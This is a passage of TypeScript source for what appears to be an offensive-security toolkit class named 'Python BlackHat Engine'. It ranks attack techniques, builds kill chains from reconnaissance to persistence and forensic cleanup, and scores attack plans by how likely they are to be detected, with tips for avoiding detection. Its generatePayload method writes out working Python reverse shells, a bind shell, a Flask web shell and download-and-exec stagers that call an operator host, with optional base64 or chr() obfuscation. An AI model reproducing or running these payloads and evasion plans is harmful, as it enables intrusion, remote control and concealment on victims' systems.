      ...(this.reverseEngineeringTechniques as unknown as AnyTechnique[]),
      ...(this.pythonTools as unknown as AnyTechnique[]),
    ]
    return all.find(item => item.id === id)
  }

  getDomainSummary(domain: AttackDomain): {
    domain: AttackDomain
    totalTechniques: number
    libraries: PythonLibraryProfile[]
    tools: PythonTool[]
    difficultyBreakdown: Record<Difficulty, number>
  } {
    this.stats.totalLookups++
    const libs = this.pythonLibraries.filter(l => l.domain === domain)
    const tools = this.pythonTools.filter(t => t.domain === domain)

    const allItems: { difficulty?: Difficulty }[] = []
    if (domain === 'exploit_dev') allItems.push(...this.exploitDevTechniques)
    if (domain === 'malware') allItems.push(...this.malwareTechniques)
    if (domain === 'network_attack') allItems.push(...this.networkAttacks)
    if (domain === 'web_exploitation') allItems.push(...this.webExploits)
    if (domain === 'reconnaissance') allItems.push(...this.reconTechniques)
    if (domain === 'crypto_attack') allItems.push(...this.cryptoAttacks)
    if (domain === 'reverse_engineering') allItems.push(...this.reverseEngineeringTechniques)

    const difficultyBreakdown: Record<Difficulty, number> = {
      beginner: 0,
      intermediate: 0,
      advanced: 0,
      expert: 0,
    }
    for (const item of allItems) {
      if (item.difficulty) {
        difficultyBreakdown[item.difficulty]++
      }
    }

    return {
      domain,
      totalTechniques: allItems.length + tools.length,
      libraries: libs,
      tools,
      difficultyBreakdown,
    }
  }

  getAttackSurface(target: string): {
    target: string
    webAttacks: WebExploit[]
    networkAttacks: NetworkAttack[]
    socialAttacks: SocialEngineeringAttack[]
    cryptoAttacks: CryptoAttack[]
    applicablePrivEsc: PrivEscPath[]
    recommendedRecon: ReconTechnique[]
    totalVectors: number
  } {
    const isWeb = target.includes('http') || target.includes('www') || target.includes('.')
    const isInternal =
      target.includes('10.') || target.includes('192.168.') || target.includes('172.')

    const webAttacks = isWeb ? this.webExploits.slice(0, 5) : []
    const netAttacks = isInternal
      ? this.networkAttacks
          .filter(a => ['arp_spoof', 'mitm', 'sniffing', 'dhcp_attack'].includes(a.category))
          .slice(0, 4)
      : this.networkAttacks
          .filter(a => ['dns_spoof', 'packet_injection'].includes(a.category))
          .slice(0, 3)
    const socialAttacks = this.socialEngineeringAttacks
      .filter(a => ['phishing', 'spear_phishing', 'credential_harvest'].includes(a.category))
      .slice(0, 3)
    const cryptoAttacks = this.cryptoAttacks
      .filter(a => ['password_attack', 'hash_cracking'].includes(a.category))
      .slice(0, 3)
    const privEsc = isInternal
      ? this.privEscPaths
          .filter(p => p.platform === 'linux' || p.platform === 'cross_platform')
          .slice(0, 4)
      : this.privEscPaths.filter(p => p.platform === 'windows').slice(0, 4)
    const recon = isWeb
      ? this.reconTechniques
          .filter(r =>
            ['web_fingerprint', 'subdomain_enum', 'vuln_scan', 'osint'].includes(r.category),
          )
          .slice(0, 4)
      : this.reconTechniques
          .filter(r => ['port_scan', 'network_map', 'service_enum'].includes(r.category))
          .slice(0, 4)

    return {
      target,
      webAttacks,
      networkAttacks: netAttacks,
      socialAttacks,
      cryptoAttacks,
      applicablePrivEsc: privEsc,
      recommendedRecon: recon,
      totalVectors:
        webAttacks.length + netAttacks.length + socialAttacks.length + cryptoAttacks.length,
    }
  }

  recommendTools(
    objective: string,
    platform: TargetOS,
  ): {
    tools: PythonTool[]
    libraries: PythonLibraryProfile[]
    techniques: string[]
  } {
    this.stats.totalLookups++
    const lower = objective.toLowerCase()
    const matchDomains: AttackDomain[] = []

    if (lower.includes('web') || lower.includes('sql') || lower.includes('xss'))
      matchDomains.push('web_exploitation')
    if (lower.includes('network') || lower.includes('mitm') || lower.includes('arp'))
      matchDomains.push('network_attack')
    if (lower.includes('exploit') || lower.includes('overflow') || lower.includes('rop'))
      matchDomains.push('exploit_dev')
    if (lower.includes('malware') || lower.includes('rat') || lower.includes('backdoor'))
      matchDomains.push('malware')
    if (lower.includes('recon') || lower.includes('scan') || lower.includes('osint'))
      matchDomains.push('reconnaissance')
    if (lower.includes('privesc') || lower.includes('privilege') || lower.includes('root'))
      matchDomains.push('privilege_escalation')
    if (lower.includes('c2') || lower.includes('command') || lower.includes('persist'))
      matchDomains.push('c2_framework')
    if (lower.includes('evasion') || lower.includes('bypass') || lower.includes('stealth'))
      matchDomains.push('evasion')
    if (lower.includes('crypto') || lower.includes('hash') || lower.includes('password'))
      matchDomains.push('crypto_attack')
    if (lower.includes('social') || lower.includes('phish') || lower.includes('human'))
      matchDomains.push('social_engineering')
    if (lower.includes('forensic') || lower.includes('log') || lower.includes('cleanup'))
      matchDomains.push('forensics_evasion')
    if (lower.includes('reverse') || lower.includes('binary') || lower.includes('disasm'))
      matchDomains.push('reverse_engineering')

    if (matchDomains.length === 0) matchDomains.push('reconnaissance', 'web_exploitation')

    const tools = this.pythonTools
      .filter(
        t =>
          matchDomains.includes(t.domain) &&
          (t.targetOS === platform || t.targetOS === 'cross_platform'),
      )
      .slice(0, 8)

    const libs = this.pythonLibraries.filter(l => matchDomains.includes(l.domain)).slice(0, 8)

    const techniques: string[] = []
    for (const domain of matchDomains) {
      if (domain === 'web_exploitation')
        techniques.push(...this.webExploits.slice(0, 2).map(e => e.name))
      if (domain === 'network_attack')
        techniques.push(...this.networkAttacks.slice(0, 2).map(a => a.name))
      if (domain === 'exploit_dev')
        techniques.push(...this.exploitDevTechniques.slice(0, 2).map(t => t.name))
      if (domain === 'crypto_attack')
        techniques.push(...this.cryptoAttacks.slice(0, 2).map(a => a.name))
      if (domain === 'social_engineering')
        techniques.push(...this.socialEngineeringAttacks.slice(0, 2).map(a => a.name))
      if (domain === 'reverse_engineering')
        techniques.push(...this.reverseEngineeringTechniques.slice(0, 2).map(t => t.name))
    }

    return { tools, libraries: libs, techniques: [...new Set(techniques)] }
  }

  getAttackDomains(): { domain: AttackDomain; count: number; enabled: boolean }[] {
    return [
      {
        domain: 'exploit_dev',
        count: this.exploitDevTechniques.length,
        enabled: this.config.enableExploitDev,
      },
      {
        domain: 'malware',
        count: this.malwareTechniques.length,
        enabled: this.config.enableMalware,
      },
      {
        domain: 'network_attack',
        count: this.networkAttacks.length,
        enabled: this.config.enableNetworkAttacks,
      },
      {
        domain: 'web_exploitation',
        count: this.webExploits.length,
        enabled: this.config.enableWebExploitation,
      },
      {
        domain: 'reverse_engineering',
        count: this.reverseEngineeringTechniques.length,
        enabled: this.config.enableReverseEngineering,
      },
      {
        domain: 'crypto_attack',
        count: this.cryptoAttacks.length,
        enabled: this.config.enableCryptoAttacks,
      },
      {
        domain: 'reconnaissance',
        count: this.reconTechniques.length,
        enabled: this.config.enableRecon,
      },
      {
        domain: 'privilege_escalation',
        count: this.privEscPaths.length,
        enabled: this.config.enablePrivEsc,
      },
      { domain: 'c2_framework', count: this.c2Configs.length, enabled: this.config.enableC2 },
      { domain: 'evasion', count: this.evasionMethods.length, enabled: this.config.enableEvasion },
      {
        domain: 'forensics_evasion',
        count: this.forensicsEvasionTechniques.length,
        enabled: this.config.enableForensicsEvasion,
      },
      {
        domain: 'social_engineering',
        count: this.socialEngineeringAttacks.length,
        enabled: this.config.enableSocialEngineering,
      },
    ]
  }

  getByDifficulty(difficulty: Difficulty): {
    exploitDev: ExploitDevTechnique[]
    malware: MalwareTechnique[]
    networkAttacks: NetworkAttack[]
    webExploits: WebExploit[]
    recon: ReconTechnique[]
    cryptoAttacks: CryptoAttack[]
    reverseEngineering: ReverseEngineeringTechnique[]
    socialEngineering: SocialEngineeringAttack[]
    tools: PythonTool[]
  } {
    return {
      exploitDev: this.exploitDevTechniques.filter(t => t.difficulty === difficulty),
      malware: this.malwareTechniques.filter(t => t.difficulty === difficulty),
      networkAttacks: this.networkAttacks.filter(a => a.difficulty === difficulty),
      webExploits: this.webExploits.filter(e => e.difficulty === difficulty),
      recon: this.reconTechniques.filter(r => r.difficulty === difficulty),
      cryptoAttacks: this.cryptoAttacks.filter(a => a.difficulty === difficulty),
      reverseEngineering: this.reverseEngineeringTechniques.filter(
        t => t.difficulty === difficulty,
      ),
      socialEngineering: this.socialEngineeringAttacks.filter(a => a.difficulty === difficulty),
      tools: this.pythonTools.filter(t => t.difficulty === difficulty),
    }
  }

  getAllRequiredLibraries(domain?: AttackDomain): string[] {
    const libs = new Set<string>()

    const addLibs = (libraries: string[]) => {
      for (const lib of libraries) libs.add(lib)
    }

    if (!domain || domain === 'exploit_dev') {
      this.exploitDevTechniques.forEach(t => addLibs(t.libraries))
    }
    if (!domain || domain === 'malware') {
      this.malwareTechniques.forEach(t => addLibs(t.libraries))
    }
    if (!domain || domain === 'network_attack') {
      this.networkAttacks.forEach(a => addLibs(a.libraries))
    }
    if (!domain || domain === 'web_exploitation') {
      this.webExploits.forEach(e => addLibs(e.libraries))
    }
    if (!domain || domain === 'reconnaissance') {
      this.reconTechniques.forEach(r => addLibs(r.libraries))
    }
    if (!domain || domain === 'c2_framework') {
      this.c2Configs.forEach(c => addLibs(c.libraries))
    }
    if (!domain || domain === 'crypto_attack') {
      this.cryptoAttacks.forEach(a => addLibs(a.libraries))
    }
    if (!domain || domain === 'social_engineering') {
      this.socialEngineeringAttacks.forEach(a => addLibs(a.libraries))
    }
    if (!domain || domain === 'forensics_evasion') {
      this.forensicsEvasionTechniques.forEach(t => addLibs(t.libraries))
    }
    if (!domain || domain === 'reverse_engineering') {
      this.reverseEngineeringTechniques.forEach(t => addLibs(t.libraries))
    }

    return [...libs].sort()
  }

  generateRequirementsTxt(domains?: AttackDomain[]): string {
    const selectedDomains =
      domains ??
      ([
        'exploit_dev',
        'malware',
        'network_attack',
        'web_exploitation',
        'reconnaissance',
        'privilege_escalation',
        'c2_framework',
        'evasion',
        'crypto_attack',
        'social_engineering',
        'forensics_evasion',
        'reverse_engineering',
      ] as AttackDomain[])

    const packages = new Set<string>()
    for (const domain of selectedDomains) {
      for (const lib of this.pythonLibraries.filter(l => l.domain === domain)) {
        packages.add(`${lib.pipPackage}>=${lib.version}`)
      }
    }

    const lines = [
      '# Python BlackHat Engine — Auto-generated requirements',
      `# Domains: ${selectedDomains.join(', ')}`,
      `# Generated: ${new Date().toISOString()}`,
      '',
    ]
    for (const pkg of [...packages].sort()) {
      lines.push(pkg)
    }
    return lines.join('\n')
  }

  getMitreMapping(): { technique: string; tools: PythonTool[] }[] {
    const mapping = new Map<string, PythonTool[]>()
    for (const tool of this.pythonTools) {
      const existing = mapping.get(tool.mitreTechnique) ?? []
      existing.push(tool)
      mapping.set(tool.mitreTechnique, existing)
    }
    return [...mapping.entries()].map(([technique, tools]) => ({ technique, tools }))
  }

  getLibraryDependencyGraph(): { library: string; dependencies: string[]; dependents: string[] }[] {
    const graph: { library: string; dependencies: string[]; dependents: string[] }[] = []
    const depMap = new Map<string, string[]>()
    const revMap = new Map<string, string[]>()

    for (const lib of this.pythonLibraries) {
      depMap.set(lib.pipPackage, lib.dependencies)
      for (const dep of lib.dependencies) {
        const existing = revMap.get(dep) ?? []
        existing.push(lib.pipPackage)
        revMap.set(dep, existing)
      }
    }

    for (const lib of this.pythonLibraries) {
      graph.push({
        library: lib.pipPackage,
        dependencies: lib.dependencies,
        dependents: revMap.get(lib.pipPackage) ?? [],
      })
    }

    return graph
  }

  getToolsByPlatform(platform: TargetOS): {
    tools: PythonTool[]
    privEsc: PrivEscPath[]
    techniques: string[]
    totalAvailable: number
  } {
    this.stats.totalLookups++
    const tools = this.pythonTools.filter(
      t => t.targetOS === platform || t.targetOS === 'cross_platform',
    )
    const privEsc = this.privEscPaths.filter(
      p => p.platform === platform || p.platform === 'cross_platform',
    )

    const techniques: string[] = []
    if (platform === 'windows') {
      techniques.push(
        'Registry persistence',
        'Token manipulation',
        'DLL hijacking',
        'Service exploitation',
        'Named pipe impersonation',
        'COM object hijacking',
        'WMI execution',
        'PowerShell abuse',
      )
    } else if (platform === 'linux') {
      techniques.push(
        'SUID exploitation',
        'Capability abuse',
        'Cron job hijacking',
        'Kernel exploitation',
        'Container escape',
        'LD_PRELOAD injection',
        'Shared library hijacking',
        'proc/sys abuse',
      )
    } else {
      techniques.push(
        'Cross-platform Python payloads',
        'Web-based attacks',
        'Network-level attacks',
        'Social engineering',
      )
    }

    return {
      tools,
      privEsc,
      techniques,
      totalAvailable: tools.length + privEsc.length,
    }
  }

  getEvasionChain(targetDefenses: string[]): {
    defenses: string[]
    evasionPlan: {
      defense: string
      techniques: EvasionMethod[]
      forensics: ForensicsEvasionTechnique[]
    }[]
    overallEffectiveness: number
    gaps: string[]
  } {
    const plan: {
      defense: string
      techniques: EvasionMethod[]
      forensics: ForensicsEvasionTechnique[]
    }[] = []
    let totalEffectiveness = 0
    let coveredDefenses = 0
    const gaps: string[] = []

    for (const defense of targetDefenses) {
      const lower = defense.toLowerCase()
      const matchingEvasion = this.evasionMethods.filter(
        e =>
          e.targetDefense.toLowerCase().includes(lower) || e.category.toLowerCase().includes(lower),
      )
      const matchingForensics = this.forensicsEvasionTechniques.filter(
        f =>
          f.targetArtifact.toLowerCase().includes(lower) ||
          f.category.toLowerCase().includes(lower),
      )

      if (matchingEvasion.length > 0 || matchingForensics.length > 0) {
        coveredDefenses++
        const avgEffectiveness =
          matchingEvasion.length > 0
            ? matchingEvasion.reduce((sum, e) => sum + e.effectiveness, 0) / matchingEvasion.length
            : matchingForensics.reduce((sum, f) => sum + f.effectiveness, 0) /
              matchingForensics.length
        totalEffectiveness += avgEffectiveness
      } else {
        gaps.push(defense)
      }

      plan.push({
        defense,
        techniques: matchingEvasion,
        forensics: matchingForensics,
      })
    }

    const overallEffectiveness =
      coveredDefenses > 0 ? round2(totalEffectiveness / coveredDefenses) : 0

    return {
      defenses: targetDefenses,
      evasionPlan: plan,
      overallEffectiveness,
      gaps,
    }
  }

  assessRisk(attackPlan: { phases: { phase: string; techniques: string[] }[] }): {
    overallRisk: 'low' | 'medium' | 'high' | 'critical'
    detectionProbability: number
    noiseLevel: number
    timeEstimate: string
    recommendations: string[]
  } {
    const totalTechniques = attackPlan.phases.reduce((sum, p) => sum + p.techniques.length, 0)
    const noiseLevel = clamp(totalTechniques / 20, 0, 1)
    const detectionProbability = clamp(0.1 + noiseLevel * 0.6, 0, 1)

    let overallRisk: 'low' | 'medium' | 'high' | 'critical'
    if (detectionProbability > 0.7) overallRisk = 'critical'
    else if (detectionProbability > 0.5) overallRisk = 'high'
    else if (detectionProbability > 0.3) overallRisk = 'medium'
    else overallRisk = 'low'

    const timeEstimate =
      totalTechniques > 20
        ? '3-6 weeks'
        : totalTechniques > 15
          ? '2-4 weeks'
          : totalTechniques > 10
            ? '1-2 weeks'
            : totalTechniques > 5
              ? '3-7 days'
              : '1-3 days'

    const recommendations: string[] = []
    if (noiseLevel > 0.5) {
      recommendations.push('Consider reducing active scanning — use passive techniques first')
      recommendations.push('Implement time delays between attack phases to reduce detection')
    }
    if (detectionProbability > 0.5) {
      recommendations.push('Prioritize evasion techniques before exploitation')
      recommendations.push('Use encrypted C2 channels with domain fronting')
      recommendations.push(
        'Consider social engineering as initial access to minimize network noise',
      )
    }
    if (totalTechniques > 15) {
      recommendations.push('Break attack into multiple independent operations')
      recommendations.push('Use separate infrastructure for each phase')
    }
    if (recommendations.length === 0) {
      recommendations.push('Attack plan has acceptable risk profile')
      recommendations.push('Monitor for detection indicators during execution')
    }

    return {
      overallRisk,
      detectionProbability: round2(detectionProbability),
      noiseLevel: round2(noiseLevel),
      timeEstimate,
      recommendations,
    }
  }

  exportConfig(): {
    config: PythonBlackHatConfig
    stats: PythonBlackHatStats
    knowledgeBase: {
      libraries: number
      exploitDev: number
      malware: number
      networkAttacks: number
      webExploits: number
      recon: number
      privEsc: number
      c2: number
      evasion: number
      tools: number
      crypto: number
      social: number
      forensics: number
      reverseEng: number
      total: number
    }
    version: string
  } {
    const kb = this.getKnowledgeStats()
    return {
      config: { ...this.config },
      stats: { ...this.stats },
      knowledgeBase: {
        libraries: kb.totalLibraries,
        exploitDev: kb.totalExploitDev,
        malware: kb.totalMalware,
        networkAttacks: kb.totalNetworkAttacks,
        webExploits: kb.totalWebExploits,
        recon: kb.totalRecon,
        privEsc: kb.totalPrivEsc,
        c2: kb.totalC2,
        evasion: kb.totalEvasion,
        tools: kb.totalTools,
        crypto: kb.totalCryptoAttacks,
        social: kb.totalSocialEngineering,
        forensics: kb.totalForensicsEvasion,
        reverseEng: kb.totalReverseEngineering,
        total: kb.totalKnowledgeItems,
      },
      version: '2.0.0',
    }
  }

  validateIntegrity(): {
    valid: boolean
    duplicateIds: string[]
    emptyCategories: string[]
    totalEntries: number
    totalDomains: number
  } {
    const allIds: string[] = []
    const addIds = (items: { id: string }[]) => {
      for (const item of items) allIds.push(item.id)
    }

    addIds(this.exploitDevTechniques as unknown as { id: string }[])
    addIds(this.malwareTechniques as unknown as { id: string }[])
    addIds(this.networkAttacks as unknown as { id: string }[])
    addIds(this.webExploits as unknown as { id: string }[])
    addIds(this.reconTechniques as unknown as { id: string }[])
    addIds(this.privEscPaths as unknown as { id: string }[])
    addIds(this.c2Configs as unknown as { id: string }[])
    addIds(this.evasionMethods as unknown as { id: string }[])
    addIds(this.cryptoAttacks as unknown as { id: string }[])
    addIds(this.socialEngineeringAttacks as unknown as { id: string }[])
    addIds(this.forensicsEvasionTechniques as unknown as { id: string }[])
    addIds(this.reverseEngineeringTechniques as unknown as { id: string }[])
    addIds(this.pythonTools as unknown as { id: string }[])

    const seen = new Set<string>()
    const duplicateIds: string[] = []
    for (const id of allIds) {
      if (seen.has(id)) duplicateIds.push(id)
      seen.add(id)
    }

    const emptyCategories: string[] = []
    if (this.exploitDevTechniques.length === 0) emptyCategories.push('exploit_dev')
    if (this.malwareTechniques.length === 0) emptyCategories.push('malware')
    if (this.networkAttacks.length === 0) emptyCategories.push('network_attack')
    if (this.webExploits.length === 0) emptyCategories.push('web_exploitation')
    if (this.reconTechniques.length === 0) emptyCategories.push('reconnaissance')
    if (this.privEscPaths.length === 0) emptyCategories.push('privilege_escalation')
    if (this.c2Configs.length === 0) emptyCategories.push('c2_framework')
    if (this.evasionMethods.length === 0) emptyCategories.push('evasion')
    if (this.cryptoAttacks.length === 0) emptyCategories.push('crypto_attack')
    if (this.socialEngineeringAttacks.length === 0) emptyCategories.push('social_engineering')
    if (this.forensicsEvasionTechniques.length === 0) emptyCategories.push('forensics_evasion')
    if (this.reverseEngineeringTechniques.length === 0) emptyCategories.push('reverse_engineering')

    return {
      valid: duplicateIds.length === 0 && emptyCategories.length === 0,
      duplicateIds,
      emptyCategories,
      totalEntries: allIds.length,
      totalDomains: 14,
    }
  }

  getTopToolsByReliability(count?: number): PythonTool[] {
    const limit = count ?? 10
    return [...this.pythonTools].sort((a, b) => b.reliability - a.reliability).slice(0, limit)
  }

  getTopToolsByStealth(count?: number): PythonTool[] {
    const limit = count ?? 10
    return [...this.pythonTools].sort((a, b) => b.stealthRating - a.stealthRating).slice(0, limit)
  }

  getStealthProfile(): {
    stealthiestC2: C2Config[]
    stealthiestEvasion: EvasionMethod[]
    stealthiestForensics: ForensicsEvasionTechnique[]
    stealthiestTools: PythonTool[]
    overallStealthScore: number
  } {
    const stealthiestC2 = this.getStealthiestC2(0.75).slice(0, 3)
    const stealthiestEvasion = this.getMostEffectiveEvasion(0.7).slice(0, 3)
    const stealthiestForensics = this.getForensicsEvasionByEffectiveness(0.7).slice(0, 3)
    const stealthiestTools = this.getTopToolsByStealth(3)

    const scores: number[] = [
      ...stealthiestC2.map(c => c.stealthRating),
      ...stealthiestEvasion.map(e => e.effectiveness),
      ...stealthiestForensics.map(f => f.effectiveness),
      ...stealthiestTools.map(t => t.stealthRating),
    ]

    const overallStealthScore =
      scores.length > 0 ? round2(scores.reduce((a, b) => a + b, 0) / scores.length) : 0

    return {
      stealthiestC2,
      stealthiestEvasion,
      stealthiestForensics,
      stealthiestTools,
      overallStealthScore,
    }
  }

  // ── Report Generation ──

  generateReport(target: string): {
    target: string
    timestamp: string
    reconOptions: number
    exploitOptions: number
    privEscOptions: number
    persistenceOptions: number
    evasionOptions: number
    cryptoOptions: number
    socialOptions: number
    forensicsOptions: number
    reverseOptions: number
    totalTechniques: number
    recommendedApproach: string
  } {
    const isWeb = target.includes('http') || target.includes('www')
    const totalTechniques =
      this.reconTechniques.length +
      this.webExploits.length +
      this.networkAttacks.length +
      this.privEscPaths.length +
      this.c2Configs.length +
      this.evasionMethods.length +
      this.cryptoAttacks.length +
      this.socialEngineeringAttacks.length +
      this.forensicsEvasionTechniques.length +
      this.reverseEngineeringTechniques.length

    const recommendedApproach = isWeb
      ? 'Web application penetration test: recon → web exploit → privesc → persist → evade'
      : 'Network penetration test: recon → network attack → privesc → lateral movement → persist → evade'

    return {
      target,
      timestamp: new Date().toISOString(),
      reconOptions: this.reconTechniques.length,
      exploitOptions:
        this.webExploits.length + this.networkAttacks.length + this.exploitDevTechniques.length,
      privEscOptions: this.privEscPaths.length,
      persistenceOptions: this.c2Configs.length + this.malwareTechniques.length,
      evasionOptions: this.evasionMethods.length,
      cryptoOptions: this.cryptoAttacks.length,
      socialOptions: this.socialEngineeringAttacks.length,
      forensicsOptions: this.forensicsEvasionTechniques.length,
      reverseOptions: this.reverseEngineeringTechniques.length,
      totalTechniques,
      recommendedApproach,
    }
  }

  // ── Kill Chain Builder ──

  buildKillChain(
    target: string,
    platform: TargetOS,
  ): {
    phases: { phase: string; techniques: string[]; tools: string[] }[]
    estimatedTime: string
    difficulty: Difficulty
  } {
    const isWeb = target.includes('http') || target.includes('www')
    const phases: { phase: string; techniques: string[]; tools: string[] }[] = []

    // Phase 1: Reconnaissance
    const reconTechs = isWeb
      ? this.reconTechniques
          .filter(r => ['web_fingerprint', 'subdomain_enum', 'osint'].includes(r.category))
          .slice(0, 3)
      : this.reconTechniques
          .filter(r => ['port_scan', 'network_map', 'service_enum'].includes(r.category))
          .slice(0, 3)
    phases.push({
      phase: 'Reconnaissance',
      techniques: reconTechs.map(r => r.name),
      tools: [...new Set(reconTechs.flatMap(r => r.libraries))],
    })

    // Phase 2: Weaponization
    const cryptoTechs = this.cryptoAttacks
      .filter(a => ['password_attack', 'hash_cracking'].includes(a.category))
      .slice(0, 2)
    phases.push({
      phase: 'Weaponization',
      techniques: cryptoTechs.map(a => a.name),
      tools: [...new Set(cryptoTechs.flatMap(a => a.libraries))],
    })

    // Phase 3: Delivery
    const socialTechs = this.socialEngineeringAttacks
      .filter(a => ['phishing', 'spear_phishing'].includes(a.category))
      .slice(0, 2)
    phases.push({
      phase: 'Delivery',
      techniques: socialTechs.map(a => a.name),
      tools: [...new Set(socialTechs.flatMap(a => a.libraries))],
    })

    // Phase 4: Exploitation
    const exploitTechs = isWeb
      ? this.webExploits.filter(e => ['sqli', 'rce', 'ssti'].includes(e.category)).slice(0, 3)
      : this.networkAttacks
          .filter(a => ['mitm', 'arp_spoof', 'sniffing'].includes(a.category))
          .slice(0, 3)
    phases.push({
      phase: 'Exploitation',
      techniques: exploitTechs.map(e => e.name),
      tools: [...new Set(exploitTechs.flatMap(e => e.libraries))],
    })

    // Phase 5: Privilege Escalation
    const privTechs = this.privEscPaths
      .filter(p => p.platform === platform || p.platform === 'cross_platform')
      .slice(0, 3)
    phases.push({
      phase: 'Privilege Escalation',
      techniques: privTechs.map(p => p.name),
      tools: ['pwntools', 'subprocess', 'ctypes'],
    })

    // Phase 6: Persistence
    const c2Techs = this.getStealthiestC2(0.7).slice(0, 2)
    phases.push({
      phase: 'Persistence',
      techniques: c2Techs.map(c => c.name),
      tools: [...new Set(c2Techs.flatMap(c => c.libraries))],
    })

    // Phase 7: Evasion & Cleanup
    const evasionTechs = this.getMostEffectiveEvasion(0.6).slice(0, 2)
    const forensicsTechs = this.getForensicsEvasionByEffectiveness(0.6).slice(0, 2)
    phases.push({
      phase: 'Evasion & Cleanup',
      techniques: [...evasionTechs.map(e => e.name), ...forensicsTechs.map(f => f.name)],
      tools: [...new Set(forensicsTechs.flatMap(f => f.libraries))],
    })

    const totalTechniques = phases.reduce((sum, p) => sum + p.techniques.length, 0)
    const estimatedTime =
      totalTechniques > 15
        ? '2-4 weeks'
        : totalTechniques > 10
          ? '1-2 weeks'
          : totalTechniques > 5
            ? '3-5 days'
            : '1-2 days'
    const difficulty: Difficulty =
      totalTechniques > 15
        ? 'expert'
        : totalTechniques > 10
          ? 'advanced'
          : totalTechniques > 5
            ? 'intermediate'
            : 'beginner'

    return { phases, estimatedTime, difficulty }
  }

  // ── Payload Generation ──

  generatePayload(
    type: 'reverse_shell' | 'bind_shell' | 'meterpreter' | 'web_shell' | 'dropper',
    platform: TargetOS,
    options?: { encode?: boolean; obfuscate?: boolean; lhost?: string; lport?: number },
  ): {
    code: string
    language: string
    size: string
    detection: string[]
  } {
    const lhost = options?.lhost ?? '10.0.0.1'
    const lport = options?.lport ?? 4444
    const encode = options?.encode ?? false
    const obfuscate = options?.obfuscate ?? false

    let code: string
    let language: string
    let size: string
    let detection: string[]

    switch (type) {
      case 'reverse_shell':
        code =
          platform === 'windows'
            ? `import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"])`
            : `import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`
        language = 'python'
        size = '~200 bytes'
        detection = [
          'Network connection to external IP',
          'subprocess.call with shell',
          'socket connect',
        ]
        break
      case 'bind_shell':
        code = `import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])`
        language = 'python'
        size = '~220 bytes'
        detection = ['Listening socket on unusual port', 'subprocess.call with shell']
        break
      case 'meterpreter':
        code = `import urllib.request,base64,ssl;ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;r=urllib.request.urlopen("https://${lhost}:${lport}/payload",context=ctx);exec(base64.b64decode(r.read()))`
        language = 'python'
        size = '~280 bytes'
        detection = [
          'HTTPS connection with cert bypass',
          'base64 decode + exec',
          'Dynamic code loading',
        ]
        break
      case 'web_shell':
        code = `from flask import Flask,request;import subprocess;app=Flask(__name__)\n@app.route("/cmd")\ndef cmd():return subprocess.check_output(request.args.get("c","id"),shell=True)\napp.run(host="0.0.0.0",port=8080)`
        language = 'python'
        size = '~250 bytes'
        detection = [
          'Flask web server on unusual port',
          'subprocess.check_output with shell=True',
          'Command parameter in URL',
        ]
        break
      case 'dropper':
        code = `import urllib.request,tempfile,os,subprocess;url="https://${lhost}:${lport}/stage2";data=urllib.request.urlopen(url).read();exec(compile(data,"<stage2>","exec"))`
        language = 'python'
        size = '~200 bytes'
        detection = [
          'HTTPS download from external host',
          'exec with compiled code',
          'Staged payload delivery',
        ]
        break
    }

    if (encode) {
      code = `import base64;exec(base64.b64decode("${Buffer.from(code).toString('base64')}"))`
      size = '~' + code.length + ' bytes'
      detection.push('Base64 encoded payload')
    }

    if (obfuscate) {
      code = `exec("".join(chr(c) for c in [${[...Buffer.from(code)].join(',')}]))`
      size = '~' + code.length + ' bytes'
      detection.push('chr() obfuscated payload')
    }

    return { code, language, size, detection }
  }

  // ── Statistics ──

  getKnowledgeStats(): {
    totalLibraries: number
    totalExploitDev: number
    totalMalware: number
    totalNetworkAttacks: number
    totalWebExploits: number
    totalRecon: number
    totalPrivEsc: number
    totalC2: number
    totalEvasion: number
    totalTools: number
    totalCryptoAttacks: number
    totalSocialEngineering: number
    totalForensicsEvasion: number
    totalReverseEngineering: number
    totalKnowledgeItems: number
  } {
    return {
      totalLibraries: this.pythonLibraries.length,
      totalExploitDev: this.exploitDevTechniques.length,
      totalMalware: this.malwareTechniques.length,
      totalNetworkAttacks: this.networkAttacks.length,
      totalWebExploits: this.webExploits.length,
      totalRecon: this.reconTechniques.length,
      totalPrivEsc: this.privEscPaths.length,
      totalC2: this.c2Configs.length,
      totalEvasion: this.evasionMethods.length,
      totalTools: this.pythonTools.length,
      totalCryptoAttacks: this.cryptoAttacks.length,
      totalSocialEngineering: this.socialEngineeringAttacks.length,
      totalForensicsEvasion: this.forensicsEvasionTechniques.length,
      totalReverseEngineering: this.reverseEngineeringTechniques.length,
      totalKnowledgeItems:
        this.pythonLibraries.length +
        this.exploitDevTechniques.length +
        this.malwareTechniques.length +
        this.networkAttacks.length +
        this.webExploits.length +
        this.reconTechniques.length +
        this.privEscPaths.length +
        this.c2Configs.length +
        this.evasionMethods.length +
        this.pythonTools.length +
        this.cryptoAttacks.length +
        this.socialEngineeringAttacks.length +
        this.forensicsEvasionTechniques.length +
        this.reverseEngineeringTechniques.length,
    }
  }

  // ── Serialization ──

  getStats(): Readonly<PythonBlackHatStats> {
    return { ...this.stats }
  }

  provideFeedback(): void {
    this.stats.feedbackCount++
  }

  serialize(): string {
    return JSON.stringify({ config: this.config, stats: this.stats })
  }

  deserialize(json: string): void {
    const data = JSON.parse(json)
    if (data.stats) {
      Object.assign(this.stats, data.stats)
    }
  }
}
